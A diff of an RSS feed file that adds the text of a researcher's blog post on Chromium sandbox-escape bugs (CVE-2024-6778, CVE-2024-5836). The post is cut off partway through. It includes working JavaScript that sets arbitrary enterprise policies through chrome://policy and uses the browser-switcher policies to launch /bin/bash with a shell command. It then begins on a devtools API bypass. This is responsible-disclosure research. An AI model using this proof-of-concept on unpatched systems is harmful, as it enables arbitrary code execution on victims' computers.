@@ -4,12 +4,556 @@
         <title>HN100 - Readable Contents</title>
         <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
         <description>Uses Readability to add bodies to the RSS feed</description>
-        <lastBuildDate>Thu, 17 Oct 2024 08:30:04 GMT</lastBuildDate>
+        <lastBuildDate>Thu, 17 Oct 2024 09:30:03 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>https://github.com/jpmonette/feed</generator>
         <language>en</language>
         <item>
-            <title><![CDATA[WordPress retaliation impacts community (183 pts)]]></title>
+            <title><![CDATA[Escaping the Chrome Sandbox Through DevTools (113 pts)]]></title>
+            <link>https://ading.dev/blog/posts/chrome_sandbox_escape.html</link>
+            <guid>41866802</guid>
+            <pubDate>Thu, 17 Oct 2024 05:55:04 GMT</pubDate>
+            <description><![CDATA[<p>URL: <a href="https://ading.dev/blog/posts/chrome_sandbox_escape.html">https://ading.dev/blog/posts/chrome_sandbox_escape.html</a>, See on <a href="https://news.ycombinator.com/item?id=41866802">Hacker News</a></p>
+<div id="readability-page-1" class="page"><div id="content_wrapper">
+        
+  
+  <p><i>By ading2210 on 10/16/24</i></p>
+  <h2>Introduction</h2>
+<p>This blog post details how I found CVE-2024-6778 and CVE-2024-5836, which are vulnerabilities within the Chromium web browser which allowed for a sandbox escape from a browser extension (with a tiny bit of user interaction). Eventually, Google paid me $20,000 for this bug report. </p>
+<p>In short, these bugs allowed a malicious Chrome extension to run any shell command on your PC, which might then be used to install some even worse malware. Instead of merely stealing your passwords and compromising your browser, an attacker could take control of your entire operating system. </p>
+<h2>WebUIs and the Chrome Sandbox</h2>
+<p>All untrusted code that Chromium runs is sandboxed, which means that it runs in an isolated environment that cannot access anything it's not supposed to. In practice, this means that the Javascript code that runs in a Chrome extension can only interact with itself and the Javascript APIs it has access to. Which APIs an extension has access to is dependent on the <a href="https://developer.chrome.com/docs/extensions/reference/permissions-list">permissions</a> that the user grants it. However, the worst that you can really do with these permissions is steal someone's logins and browser history. Everything is supposed to stay contained to within the browser.</p>
+<p>Additionally, Chromium has a few webpages that it uses for displaying its GUI, using a mechanism called <a href="https://chromium.googlesource.com/chromium/src/+/main/docs/webui_explainer.md">WebUI</a>. These are prefixed with the <code>chrome://</code> URL protocol, and include ones you've probably used like <code>chrome://settings</code> and <code>chrome://history</code>. Their purpose is to provide the user-facing UI for Chromium's features, while being written with web technologies such as HTML, CSS, and Javascript. Because they need to display and modify information that is specific to the internals of the browser, they are considered to be privileged, which means they have access to private APIs that are used nowhere else. These private APIs allow the Javascript code running on the WebUI frontend to communicate with native C++ code in the browser itself.</p>
+<p>Preventing an attacker from accessing WebUIs is important because code that runs on a WebUI page can bypass the Chromium sandbox entirely. For example, on <code>chrome://downloads</code>, clicking on a download for a <code>.exe</code> file will run the executable, and thus if this action was performed via a malicious script, that script can escape the sandbox.</p>
+<p>Running untrusted Javascript on <code>chrome://</code> pages is a common attack vector, so the receiving end of these private APIs perform some validation to ensure that they're not doing anything that the user couldn't otherwise do normally. Going back to the <code>chrome://downloads</code> example, Chromium protects against that exact scenario by requiring that to open a file from the downloads page, the action that triggers it has to come from an actual user input and not just Javascript.</p>
+<p>Of course, sometimes with these checks there's an edge case that the Chromium developers didn't account for.</p>
+<h2>About Enterprise Policies</h2>
+<p>My journey towards finding this vulnerability began when I was looking into the Chromium <a href="https://chromium.googlesource.com/chromium/src/+/HEAD/docs/enterprise/policies.md">enterprise policy system</a>. It's intended to be a way for administrators to force certain settings to be applied to devices owned by a company or school. Usually, policies tied to a Google account and are downloaded from Google's own management server. </p>
+<p><img alt="The &quot;Your browser is managed by your organization&quot; message." src="https://ading.dev/blog/assets/chrome_sandbox_escape/browser_management_msg.png"></p>
+<p>Enterprise policies also include things that the user would not be able to modify normally. For example, one of the things you can do with policies is disable the dino easter egg game:</p>
+<p><img alt="alt text" src="https://ading.dev/blog/assets/chrome_sandbox_escape/dino_policy.png"></p>
+<p>Moreover, the policies themselves are separated into two categories: user policies and device policies. </p>
+<p>Device policies are used to manage settings across an entire Chrome OS device. They can be as simple as restricting which accounts can log in or setting the release channel. Some of them can even change the behavior of the device's firmware (used to prevent developer mode or downgrading the OS). However, because this vulnerability doesn't pertain to Chrome OS, device policies can be ignored for now. </p>
+<p>User policies are applied to a specific user or browser instance. Unlike device policies, these are available on all platforms, and they can be set locally rather than relying on Google's servers. On Linux for instance, <a href="https://support.google.com/chrome/a/answer/9027408">placing a JSON file</a> inside <code>/etc/opt/chrome/policies</code> will set the user policies for all instances of Google Chrome on the device. </p>
+<p>Setting user policies using this method is somewhat inconvenient since writing to the policies directory requires root permissions. However, what if there was a way to modify these policies without creating a file? </p>
+<h2>The Policies WebUI</h2>
+<p>Notably, Chromium has a WebUI for viewing the policies applied to the current device, located at <code>chrome://policy</code>. It shows the list of policies applied, the logs for the policy service, and the ability to export these policies to a JSON file.</p>
+<p><img alt="A screenshot of the chrome://policy page" src="https://ading.dev/blog/assets/chrome_sandbox_escape/chrome_policy_page.png"></p>
+<p>This is nice and all, but normally there's no way to edit the policies from this page. Unless of course, there is an undocumented feature to do exactly that. </p>
+<h2>Abusing the Policy Test Page</h2>
+<p>When I was doing research on the subject, I came across the following entry in the <a href="https://support.google.com/chrome/a/answer/10314655#117">Chrome Enterprise release notes</a> for Chrome v117:</p>
+<blockquote>
+<p><strong>Chrome will introduce a chrome://policy/test page</strong><br>
+chrome://policy/test will allow customers to test out policies on the Beta, Dev, Canary channels. If there is enough customer demand, we will consider bringing this functionality to the Stable channel. </p>
+</blockquote>
+<p>As it turns out, this is the only place in Chromium's documentation where this feature is mentioned at all. So with nowhere else to look, I examined the Chromium source code to figure out how it is supposed to work. </p>
+<p>Using <a href="https://source.chromium.org/">Chromium Code Search</a>, I did a <a href="https://source.chromium.org/search?q=chrome:%2F%2Fpolicy%2Ftest&amp;sq=">search for <code>chrome://policy/test</code></a>, which led me to the <a href="https://source.chromium.org/chromiumos/_/chromium/chromium/src/components/policy/+/9e42c767311886dbe08c897be952b8efcfae8991:resources/webui/test/policy_test.ts;bpv=1;bpt=0;drc=41b2dd136f67dfbfbe5c73cc5dab1699709f340e">JS part of the WebUI code</a> for the policy test page. I then noticed the <a href="https://source.chromium.org/chromiumos/_/chromium/chromium/src/components/policy/+/9e42c767311886dbe08c897be952b8efcfae8991:resources/webui/test/policy_test_browser_proxy.ts;bpv=1;bpt=0;drc=0a8c7cff04f5555fb31f50742662fd398ee7febe">private API calls</a> that it uses to set the test policies:</p>
+<div><pre><span></span><code><span>export</span><span> </span><span>class</span><span> PolicyTestBrowserProxy </span><span>{</span>
+<span>  applyTestPolicies</span><span>(</span><span>policies</span><span>:</span><span> </span><span>string</span><span>,</span><span> profileSeparationResponse</span><span>:</span><span> </span><span>string</span><span>)</span><span> </span><span>{</span>
+<span>    </span><span>return</span><span> sendWithPromise</span><span>(</span><span>'setLocalTestPolicies'</span><span>,</span><span> policies</span><span>,</span><span> profileSeparationResponse</span><span>);</span>
+<span>  </span><span>}</span>
+<span>  </span><span>...</span>
+<span>}</span>
+</code></pre></div>
+
+<p>Remember how I said that these WebUI pages have access to private APIs? Well, <code>sendWithPromise()</code> is one of these. <code>sendWithPromise()</code> is really just a wrapper for <a href="https://chromium.googlesource.com/chromium/src/+/main/docs/webui_explainer.md#chrome_send"><code>chrome.send()</code></a>, which sends a request to a handler function written in C++. The handler function can then do whatever it needs to in the internals of the browser, then it may return a value which is passed back to the JS side by <code>sendWithPromise()</code>. </p>
+<p>And so, on a whim, I decided to see what calling this in the JS console would do.</p>
+<div><pre><span></span><code><span>//import cr.js since we need sendWithPromise</span>
+<span>let</span><span> cr </span><span>=</span><span> </span><span>await</span><span> </span><span>import</span><span>(</span><span>'chrome://resources/js/cr.js'</span><span>);</span>
+<span>await</span><span> cr</span><span>.</span><span>sendWithPromise</span><span>(</span><span>"setLocalTestPolicies"</span><span>,</span><span> </span><span>""</span><span>,</span><span> </span><span>""</span><span>);</span>
+</code></pre></div>
+
+<p>Unfortunately, running it simply crashed the browser. Interestingly, the following line appeared in the crash log:
+<code>[17282:17282:1016/022258.064657:FATAL:local_test_policy_loader.cc(68)] Check failed: policies.has_value() &amp;&amp; policies-&gt;is_list(). List of policies expected</code></p>
+<p>It looks like it expects a JSON string with an array of policies as the first argument, which makes sense. Let's provide one then. Luckily <code>policy_test_browser_proxy.ts</code> tells me the format it expects so I don't have to do too much guesswork.</p>
+<div><pre><span></span><code><span>let</span><span> cr </span><span>=</span><span> </span><span>await</span><span> </span><span>import</span><span>(</span><span>'chrome://resources/js/cr.js'</span><span>);</span>
+<span>let</span><span> policy </span><span>=</span><span> </span><span>JSON</span><span>.</span><span>stringify</span><span>([</span>
+<span>  </span><span>{</span><span> </span>
+<span>    name</span><span>:</span><span> </span><span>"AllowDinosaurEasterEgg"</span><span>,</span>
+<span>    value</span><span>:</span><span> </span><span>false,</span>
+<span>    level</span><span>:</span><span> </span><span>1</span><span>,</span><span> </span>
+<span>    source</span><span>:</span><span> </span><span>1</span><span>,</span>
+<span>    scope</span><span>:</span><span> </span><span>1</span>
+<span>  </span><span>}</span>
+<span>]);</span>
+<span>await</span><span> cr</span><span>.</span><span>sendWithPromise</span><span>(</span><span>"setLocalTestPolicies"</span><span>,</span><span> policy</span><span>,</span><span> </span><span>""</span><span>);</span>
+</code></pre></div>
+
+<video controls="">
+  <source src="https://ading.dev/blog/assets/chrome_sandbox_escape/test_policy_bug.mp4" type="video/mp4">
+  <p>Video info: A demonstration of the policy test page bug.</p>
+</video>
+
+<p>So after running this... it just works? I just set an arbitrary user policy by simply running some Javascript on <code>chrome://policy</code>. Clearly something is going wrong here, considering that I never explicitly enabled this feature at all.</p>
+<h2>Broken WebUI Validation</h2>
+<p>For some context, this is what the policy test page is supposed to look like when it's properly enabled. </p>
+<p><img alt="A screenshot of the policy test page." src="https://ading.dev/blog/assets/chrome_sandbox_escape/policy_test_page.png"></p>
+<p>To properly enable this page, you have to set the <code>PolicyTestPageEnabled</code> policy (also not documented anywhere). If that policy is not set to begin with, then <code>chrome://policy/test</code> just redirects back to <code>chrome://policy</code>.</p>
+<p><img alt="A screenshot of the PolicyTestPageEnabled policy." src="https://ading.dev/blog/assets/chrome_sandbox_escape/test_page_policy.png"></p>
+<p>So why was I able to set the test policies regardless of the fact that I had the <code>PolicyTestPageEnabled</code> policy disabled? To investigate this, I looked though Chromium Code Search again and found the <a href="https://source.chromium.org/chromium/chromium/src/+/main:chrome/browser/ui/webui/policy/policy_ui_handler.cc;l=318-345;drc=ee91a67071b984d80acd62ba9c015577e6c26309;bpv=0;bpt=0">WebUI handler</a> for the <code>setLocalTestPolicies</code> function on the C++ side.</p>
+<div><pre><span></span><code><span>void</span><span> </span><span>PolicyUIHandler::HandleSetLocalTestPolicies</span><span>(</span>
+<span>    </span><span>const</span><span> base</span><span>::</span><span>Value</span><span>::</span><span>List</span><span>&amp;</span><span> args</span><span>)</span><span> </span><span>{</span>
+<span>  std</span><span>::</span><span>string policies </span><span>=</span><span> args</span><span>[</span><span>1</span><span>].</span><span>GetString</span><span>();</span>
+
+<span>  policy</span><span>::</span><span>LocalTestPolicyProvider</span><span>*</span><span> local_test_provider </span><span>=</span>
+<span>      </span><span>static_cast</span><span>&lt;</span><span>policy</span><span>::</span><span>LocalTestPolicyProvider</span><span>*&gt;(</span>
+<span>          g_browser_process</span><span>-&gt;</span><span>browser_policy_connector</span><span>()</span>
+<span>              </span><span>-&gt;</span><span>local_test_policy_provider</span><span>());</span>
+
+<span>  CHECK</span><span>(</span><span>local_test_provider</span><span>);</span>
+
+<span>  Profile</span><span>::</span><span>FromWebUI</span><span>(</span><span>web_ui</span><span>())</span>
+<span>      </span><span>-&gt;</span><span>GetProfilePolicyConnector</span><span>()</span>
+<span>      </span><span>-&gt;</span><span>UseLocalTestPolicyProvider</span><span>();</span>
+
+<span>  local_test_provider</span><span>-&gt;</span><span>LoadJsonPolicies</span><span>(</span><span>policies</span><span>);</span>
+<span>  AllowJavascript</span><span>();</span>
+<span>  ResolveJavascriptCallback</span><span>(</span><span>args</span><span>[</span><span>0</span><span>],</span><span> </span><span>true</span><span>);</span>
+<span>}</span>
+</code></pre></div>
+
+<p>The only validation that this function performs is that it checks to see if <code>local_test_provider</code> exists, otherwise it crashes the entire browser. Under what conditions will <code>local_test_provider</code> exist, though? </p>
+<p>To answer that, I found the code that actually <a href="https://source.chromium.org/chromium/chromium/src/+/main:components/policy/core/common/local_test_policy_provider.cc;l=23;drc=0fba000db58b7966ef2b2e9202dabba44f13d62a;bpv=1;bpt=0">creates the local test policy provider</a>. </p>
+<div><pre><span></span><code><span>std</span><span>::</span><span>unique_ptr</span><span>&lt;</span><span>LocalTestPolicyProvider</span><span>&gt;</span>
+<span>LocalTestPolicyProvider</span><span>::</span><span>CreateIfAllowed</span><span>(</span><span>version_info</span><span>::</span><span>Channel channel</span><span>)</span><span> </span><span>{</span>
+<span>  </span><span>if</span><span> </span><span>(</span><span>utils</span><span>::</span><span>IsPolicyTestingEnabled</span><span>(</span><span>/*pref_service=*/</span><span>nullptr</span><span>,</span><span> channel</span><span>))</span><span> </span><span>{</span>
+<span>    </span><span>return</span><span> base</span><span>::</span><span>WrapUnique</span><span>(</span><span>new</span><span> LocalTestPolicyProvider</span><span>());</span>
+<span>  </span><span>}</span>
+
+<span>  </span><span>return</span><span> </span><span>nullptr</span><span>;</span>
+<span>}</span>
+</code></pre></div>
+
+<p>So this function actually does perform a check to see if the test policies are allowed. If they're not allowed, then it returns null, and attempting to set test policies like I showed earlier will cause a crash.</p>
+<p>Maybe <a href="https://source.chromium.org/chromium/chromium/src/+/main:components/policy/core/common/policy_utils.cc;drc=0fba000db58b7966ef2b2e9202dabba44f13d62a;bpv=1;bpt=0;l=13"><code>IsPolicyTestingEnabled()</code></a> is misbehaving? Here's what the function looks like:</p>
+<div><pre><span></span><code><span>bool</span><span> </span><span>IsPolicyTestingEnabled</span><span>(</span><span>PrefService</span><span>*</span><span> pref_service</span><span>,</span>
+<span>                            version_info</span><span>::</span><span>Channel channel</span><span>)</span><span> </span><span>{</span>
+<span>  </span><span>if</span><span> </span><span>(</span><span>pref_service </span><span>&amp;&amp;</span>
+<span>      </span><span>!</span><span>pref_service</span><span>-&gt;</span><span>GetBoolean</span><span>(</span><span>policy_prefs</span><span>::</span><span>kPolicyTestPageEnabled</span><span>))</span><span> </span><span>{</span>
+<span>    </span><span>return</span><span> </span><span>false</span><span>;</span>
+<span>  </span><span>}</span>
+
+<span>  </span><span>if</span><span> </span><span>(</span><span>channel </span><span>==</span><span> version_info</span><span>::</span><span>Channel</span><span>::</span><span>CANARY </span><span>||</span>
+<span>      channel </span><span>==</span><span> version_info</span><span>::</span><span>Channel</span><span>::</span><span>DEFAULT</span><span>)</span><span> </span><span>{</span>
+<span>    </span><span>return</span><span> </span><span>true</span><span>;</span>
+<span>  </span><span>}</span>
+
+<span>  </span><span>return</span><span> </span><span>false</span><span>;</span>
+<span>}</span>
+</code></pre></div>
+
+<p>This function first checks if <code>kPolicyTestPageEnabled</code> is true, which is the the policy that is supposed to enable the policy test page under normal conditions. However, you may notice that when <code>IsPolicyTestingEnabled()</code> is called, the first argument, the <code>pref_service</code>, is set to null. This causes the check to be ignored entirely.</p>
+<p>Now, the only check that remains is for the <code>channel</code>. In this context, "channel" means browser's release channel, which is something like stable, beta, dev, or canary. So in this case, only <code>Channel::CANARY</code> and <code>Channel::DEFAULT</code> is allowed. That must mean that my browser is set to either the <code>Channel::CANARY</code> or <code>Channel::DEFAULT</code>. </p>
+<p>Then does the browser <a href="https://source.chromium.org/chromium/chromium/src/+/main:chrome/common/channel_info_posix.cc;l=29-56;drc=d5cc0de2d29206d08ae4ef0980dfe049cc0344d5;bpv=0;bpt=0">know what channel it's in</a>? Here's the function where it determines that:</p>
+<div><pre><span></span><code><span>// Returns the channel state for the browser based on branding and the</span>
+<span>// CHROME_VERSION_EXTRA environment variable. In unbranded (Chromium) builds,</span>
+<span>// this function unconditionally returns `channel` = UNKNOWN and</span>
+<span>// `is_extended_stable` = false. In branded (Google Chrome) builds, this</span>
+<span>// function returns `channel` = UNKNOWN and `is_extended_stable` = false for any</span>
+<span>// unexpected $CHROME_VERSION_EXTRA value.</span>
+<span>ChannelState </span><span>GetChannelImpl</span><span>()</span><span> </span><span>{</span>
+<span>#if BUILDFLAG(GOOGLE_CHROME_BRANDING)</span>
+<span>  </span><span>const</span><span> </span><span>char</span><span>*</span><span> </span><span>const</span><span> env </span><span>=</span><span> getenv</span><span>(</span><span>"CHROME_VERSION_EXTRA"</span><span>);</span>
+<span>  </span><span>const</span><span> std</span><span>::</span><span>string_view env_str </span><span>=</span>
+<span>      env </span><span>?</span><span> std</span><span>::</span><span>string_view</span><span>(</span><span>env</span><span>)</span><span> </span><span>:</span><span> std</span><span>::</span><span>string_view</span><span>();</span>
+
+<span>  </span><span>// Ordered by decreasing expected population size.</span>
+<span>  </span><span>if</span><span> </span><span>(</span><span>env_str </span><span>==</span><span> </span><span>"stable"</span><span>)</span>
+<span>    </span><span>return</span><span> </span><span>{</span><span>version_info</span><span>::</span><span>Channel</span><span>::</span><span>STABLE</span><span>,</span><span> </span><span>/*is_extended_stable=*/</span><span>false</span><span>};</span>
+<span>  </span><span>if</span><span> </span><span>(</span><span>env_str </span><span>==</span><span> </span><span>"extended"</span><span>)</span>
+<span>    </span><span>return</span><span> </span><span>{</span><span>version_info</span><span>::</span><span>Channel</span><span>::</span><span>STABLE</span><span>,</span><span> </span><span>/*is_extended_stable=*/</span><span>true</span><span>};</span>
+<span>  </span><span>if</span><span> </span><span>(</span><span>env_str </span><span>==</span><span> </span><span>"beta"</span><span>)</span>
+<span>    </span><span>return</span><span> </span><span>{</span><span>version_info</span><span>::</span><span>Channel</span><span>::</span><span>BETA</span><span>,</span><span> </span><span>/*is_extended_stable=*/</span><span>false</span><span>};</span>
+<span>  </span><span>if</span><span> </span><span>(</span><span>env_str </span><span>==</span><span> </span><span>"unstable"</span><span>)</span><span>  </span><span>// linux version of "dev"</span>
+<span>    </span><span>return</span><span> </span><span>{</span><span>version_info</span><span>::</span><span>Channel</span><span>::</span><span>DEV</span><span>,</span><span> </span><span>/*is_extended_stable=*/</span><span>false</span><span>};</span>
+<span>  </span><span>if</span><span> </span><span>(</span><span>env_str </span><span>==</span><span> </span><span>"canary"</span><span>)</span><span> </span><span>{</span>
+<span>    </span><span>return</span><span> </span><span>{</span><span>version_info</span><span>::</span><span>Channel</span><span>::</span><span>CANARY</span><span>,</span><span> </span><span>/*is_extended_stable=*/</span><span>false</span><span>};</span>
+<span>  </span><span>}</span>
+<span>#endif  // BUILDFLAG(GOOGLE_CHROME_BRANDING)</span>
+
+<span>  </span><span>return</span><span> </span><span>{</span><span>version_info</span><span>::</span><span>Channel</span><span>::</span><span>UNKNOWN</span><span>,</span><span> </span><span>/*is_extended_stable=*/</span><span>false</span><span>};</span>
+<span>}</span>
+</code></pre></div>
+
+<p>If you don't know how the C preprocessor works, the <code>#if BUILDFLAG(GOOGLE_CHROME_BRANDING)</code> part means that the enclosed code will only be compiled if <code>BUILDFLAG(GOOGLE_CHROME_BRANDING)</code> is true. Otherwise that part of the code doesn't exist. Considering that I'm using plain Chromium and not the branded Google Chrome, the channel will always be <code>Channel::UNKNOWN</code>. This also means that, unfortunately, the bug will not work on stable builds of Google Chrome since the release channel is set to the proper value there.</p>
+<div><pre><span></span><code><span>enum</span><span> </span><span>class</span><span> </span><span>Channel</span><span> </span><span>{</span>
+<span>  UNKNOWN </span><span>=</span><span> </span><span>0</span><span>,</span>
+<span>  DEFAULT </span><span>=</span><span> UNKNOWN</span><span>,</span>
+<span>  CANARY </span><span>=</span><span> </span><span>1</span><span>,</span>
+<span>  DEV </span><span>=</span><span> </span><span>2</span><span>,</span>
+<span>  BETA </span><span>=</span><span> </span><span>3</span><span>,</span>
+<span>  STABLE </span><span>=</span><span> </span><span>4</span><span>,</span>
+<span>};</span>
+</code></pre></div>
+
+<p>Looking at the enum definition for the channels, we can see that <code>Channel::UNKNOWN</code> is actually the same as <code>Channel::DEFAULT</code>. Thus, on Chromium and its derivatives, the release channel check in <code>IsPolicyTestingEnabled()</code> always passes, and the function will always return true. </p>
+<h2>Sandbox Escape via the Browser Switcher</h2>
+<p>So what can I actually do with the ability to set arbitrary user policies? To answer that, I looked at the <a href="https://chromeenterprise.google/policies/">Chrome enterprise policy list</a>. </p>
+<p>One of the features present in enterprise policies is the <a href="https://chromium.googlesource.com/chromium/src/+/HEAD/chrome/browser/browser_switcher/README.md">Legacy Browser Support</a> module, also called the Browser Switcher. It's designed to accommodate Internet Explorer users by launching an alternative browser when the user visit certain URLs in Chromium. The behaviors of this feature are all controllable with policies. </p>
+<p>The <a href="https://chromeenterprise.google/policies/#AlternativeBrowserPath"><code>AlternativeBrowserPath</code></a> policy stood out in particular. Combined with <a href="https://chromeenterprise.google/policies/#AlternativeBrowserParameters"><code>AlternativeBrowserParameters</code></a>, this lets Chromium launch <em>any shell command</em> as the "alternate browser." However, keep in mind this only works on Linux, MacOS, and Windows, because otherwise the browser switcher policies don't exist.</p>
+<p>We can set the following policies to make Chromium launch the calculator, for instance:</p>
+<div><pre><span></span><code><span>name</span><span>:</span><span> </span><span>"BrowserSwitcherEnabled"</span>
+<span>value</span><span>:</span><span> </span><span>true</span>
+
+<span>name</span><span>:</span><span> </span><span>"BrowserSwitcherUrlList"</span>
+<span>value</span><span>:</span><span> </span><span>[</span><span>"example.com"</span><span>]</span>
+
+<span>name</span><span>:</span><span> </span><span>"AlternativeBrowserPath"</span>
+<span>value</span><span>:</span><span> </span><span>"/bin/bash"</span>
+
+<span>name</span><span>:</span><span> </span><span>"AlternativeBrowserParameters"</span>
+<span>value</span><span>:</span><span> </span><span>[</span><span>"-c"</span><span>,</span><span> </span><span>"xcalc</span><span> </span><span>#</span><span> </span><span>${url}"</span><span>]</span><span> </span>
+</code></pre></div>
+
+<p>Whenever the browser tries to navigate to <code>example.com</code>, the browser switcher will kick in and launch <code>/bin/bash</code>. <code>["-c", "xcalc # https://example.com"]</code> get passed in as arguments. The <code>-c</code> tells bash to run the command specified in the next argument. You may have noticed that the page URL gets substituted into <code>${url}</code>, and so to prevent this from messing up the command, we can simply put it behind a <code>#</code> which makes it a comment. And thus, we are able to trick Chromium into running <code>/bin/bash -c 'xcalc # https://example.com'</code>.</p>
+<p>Utilizing this from the <code>chrome://policy</code> page is rather simple. I can just set these policies using the aforementioned method, and then call <code>window.open("https://example.com")</code> to trigger the browser switcher.</p>
+<div><pre><span></span><code><span>let</span><span> cr </span><span>=</span><span> </span><span>await</span><span> </span><span>import</span><span>(</span><span>'chrome://resources/js/cr.js'</span><span>);</span>
+<span>let</span><span> policy </span><span>=</span><span> </span><span>JSON</span><span>.</span><span>stringify</span><span>([</span>
+<span>  </span><span>{</span><span> </span><span>//enable the browser switcher feature</span>
+<span>    name</span><span>:</span><span> </span><span>"BrowserSwitcherEnabled"</span><span>,</span>
+<span>    value</span><span>:</span><span> </span><span>true,</span>
+<span>    level</span><span>:</span><span> </span><span>1</span><span>,</span>
+<span>    source</span><span>:</span><span> </span><span>1</span><span>,</span>
+<span>    scope</span><span>:</span><span> </span><span>1</span>
+<span>  </span><span>},</span><span> </span>
+<span>  </span><span>{</span><span> </span><span>//set the browser switcher to trigger on example.com</span>
+<span>    name</span><span>:</span><span> </span><span>"BrowserSwitcherUrlList"</span><span>,</span>
+<span>    value</span><span>:</span><span> </span><span>[</span><span>"example.com"</span><span>],</span>
+<span>    level</span><span>:</span><span> </span><span>1</span><span>,</span>
+<span>    source</span><span>:</span><span> </span><span>1</span><span>,</span>
+<span>    scope</span><span>:</span><span> </span><span>1</span>
+<span>  </span><span>},</span><span> </span>
+<span>  </span><span>{</span><span> </span><span>//set the executable path to launch</span>
+<span>    name</span><span>:</span><span> </span><span>"AlternativeBrowserPath"</span><span>,</span>
+<span>    value</span><span>:</span><span> </span><span>"/bin/bash"</span><span>,</span>
+<span>    level</span><span>:</span><span> </span><span>1</span><span>,</span>
+<span>    source</span><span>:</span><span> </span><span>1</span><span>,</span>
+<span>    scope</span><span>:</span><span> </span><span>1</span>
+<span>  </span><span>},</span><span> </span>
+<span>  </span><span>{</span><span> </span><span>//set the arguments for the executable</span>
+<span>    name</span><span>:</span><span> </span><span>"AlternativeBrowserParameters"</span><span>,</span>
+<span>    value</span><span>:</span><span> </span><span>[</span><span>"-c"</span><span>,</span><span> </span><span>"xcalc # https://example.com"</span><span>],</span>
+<span>    level</span><span>:</span><span> </span><span>1</span><span>,</span>
+<span>    source</span><span>:</span><span> </span><span>1</span><span>,</span>
+<span>    scope</span><span>:</span><span> </span><span>1</span>
+<span>  </span><span>}</span>
+<span>]);</span>
+
+<span>//set the policies listed above</span>
+<span>await</span><span> cr</span><span>.</span><span>sendWithPromise</span><span>(</span><span>"setLocalTestPolicies"</span><span>,</span><span> policy</span><span>,</span><span> </span><span>""</span><span>);</span>
+<span>//navigate to example.com, which will trigger the browser switcher</span>
+<span>window</span><span>.</span><span>open</span><span>(</span><span>"https://example.com"</span><span>)</span>
+</code></pre></div>
+
+<video controls="">
+  <source src="https://ading.dev/blog/assets/chrome_sandbox_escape/policy_browser_switcher.mp4" type="video/mp4">
+  <p>Video info: A demonstration of using the test policies bug and the browser switcher to perform a sandbox escape.</p>
+</video>
+
+<p>And that right there is the sandbox escape. We have managed to run an arbitrary shell command via Javascript running on <code>chrome://policy</code>.</p>
+<h2>Breaking the Devtools API</h2>
+<p>You might have noticed that so far, this attack requires the victim to paste the malicious code into the browser console while they are on <code>chrome://policy</code>. Actually convincing someone to do this would be rather difficult, making the bug useless. So now, my new goal is to somehow run this JS in <code>chrome://policy</code> automatically. </p>
+<p>The most likely way this can be done is by creating a malicious Chrome extension. The Chrome extension APIs have a fairly large attack surface, and extensions by their very nature have the ability to inject JS onto pages. However, like I mentioned earlier, extensions are not allowed to run JS on privileged WebUI pages, so I needed to find a way around that.</p>
+<p>There are 4 main ways that an extension can execute JS on pages: </p>
+<ul>
+<li><a href="https://developer.chrome.com/docs/extensions/reference/api/scripting"><code>chrome.scripting</code></a>, which directly executes JS in a specific tab.</li>
+<li><a href="https://developer.chrome.com/docs/extensions/mv2/reference/tabs"><code>chrome.tabs</code></a> in Manifest v2, which works similarly to how <code>chrome.scripting</code> does.</li>
+<li><a href="https://developer.chrome.com/docs/extensions/reference/api/debugger"><code>chrome.debugger</code></a> which utilizes the remote debugging protocol.</li>
+<li><a href="https://developer.chrome.com/docs/extensions/reference/api/devtools/inspectedWindow"><code>chrome.devtools.inspectedWindow</code></a>, which interacts with the inspected page when devtools is open. </li>
+</ul>
+<p>While investigating this, I decided to look into <code>chrome.devtools.inspectedWindow</code>, as I felt that it was the most obscure and thus least hardened. That assumption turned out to be right.</p>
+<p>The way that the <code>chrome.devtools</code> APIs work is that all extensions that use the APIs must have the <a href="https://developer.chrome.com/docs/extensions/how-to/devtools/extend-devtools"><code>devtools_page</code> field</a> in their manifest. For example:</p>
+<div><pre><span></span><code><span>{</span>
+<span>  </span><span>"name"</span><span>:</span><span> </span><span>"example extension"</span><span>,</span>
+<span>  </span><span>"version"</span><span>:</span><span> </span><span>"1.0"</span><span>,</span>
+<span>  </span><span>"devtools_page"</span><span>:</span><span> </span><span>"devtools.html"</span><span>,</span>
+<span>  </span><span>...</span>
+<span>}</span>
+</code></pre></div>
+
+<p>Essentially, what this does is it specifies that whenever the user opens devtools, the devtools page loads <code>devtools.html</code> as an iframe. Within that iframe, the extension can use all of the <code>chrome.devtools</code> APIs. You can refer to the <a href="https://developer.chrome.com/docs/extensions/how-to/devtools/extend-devtools">API documentation</a> for the specifics. </p>
+<p>While researching the <code>chrome.devtools.inspectedWindow</code> APIs, I noticed a <a href="https://issues.chromium.org/issues/40053357">prior bug report by David Erceg</a>, which involved a bug with <code>chrome.devtools.inspectedWindow.eval()</code>. He managed to get code execution on a WebUI by opening devtools on a normal page, then running <code>chrome.devtools.inspectedWindow.eval()</code> with a script that crashed the page. Then, this crashed tab could be navigated to a WebUI page, where the eval request would be re-run, thus gaining code execution there.</p>
+<p>Notably, the <code>chrome.devtools</code> APIs are supposed to protect against this sort of privilege execution by simply disabling their usage after the inspected page has been navigated to a WebUI. As David Erceg demonstrated in his bug report, the key to bypassing this is to send the request for the eval before Chrome decides to disable the devtools API, and to make sure the request arrives at the WebUI page. </p>
+<p>After reading that report, I wondered if something similar was possible with <a href="https://developer.chrome.com/docs/extensions/reference/api/devtools/inspectedWindow"><code>chrome.devtools.inspectedWindow.reload()</code></a>. This function is also able to run JS on the inspected page, as long as the <code>injectedScript</code> is passed into it.</p>
+<p>The first sign that it was exploitable appeared when I tried calling <code>inspectedWindow.reload()</code> when the inspected page was an <code>about:blank</code> page which belonged to a WebUI. <code>about:blank</code> pages are unique in this regard since even though the URL is not special, they inherit the permissions and origin from the page that opened them. Because an <code>about:blank</code> page opened from a WebUI is privileged, you would expect that trying to evaluate JS on that page would be blocked.</p>
+<p><img alt="A demo of using inspectedWindow.reload() on an about:blank page." src="https://ading.dev/blog/assets/chrome_sandbox_escape/inspectedwindow_on_blank.png"></p>
+<p>Surprisingly, this actually worked. Notice that the title of the alert has the page's origin in it, which is <code>chrome://settings</code>, so the page is in fact privileged. But wait, isn't the devtools API supposed to prevent this exact thing by disabling the API entirely? Well, it doesn't consider the edge case of <code>about:blank</code> pages. Here's the code that handles disabling the API:</p>
